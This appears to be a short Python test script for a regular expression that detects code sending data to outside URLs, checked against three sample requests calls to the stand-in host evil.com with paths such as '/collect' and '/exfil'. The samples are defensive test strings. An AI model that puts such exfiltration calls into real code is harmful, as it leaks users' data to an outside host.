import re
EXFIL_URL = re.compile(
    r'(?:requests\.(?:post|put|get)|fetch|axios|http\.request|urllib)\s*\(\s*(?:f["\']|["\'])https?://(?!localhost|127\.0\.0\.1|0\.0\.0\.0)',
    re.I
)
test1 = 'requests.post(f"https://evil.com/collect", json={"data": result})'
test2 = 'requests.post("https://evil.com/collect")'
test3 = "requests.get('http://evil.com/exfil')"
print(f"f-string: {bool(EXFIL_URL.search(test1))}")
print(f"regular: {bool(EXFIL_URL.search(test2))}")
print(f"single-quote: {bool(EXFIL_URL.search(test3))}")
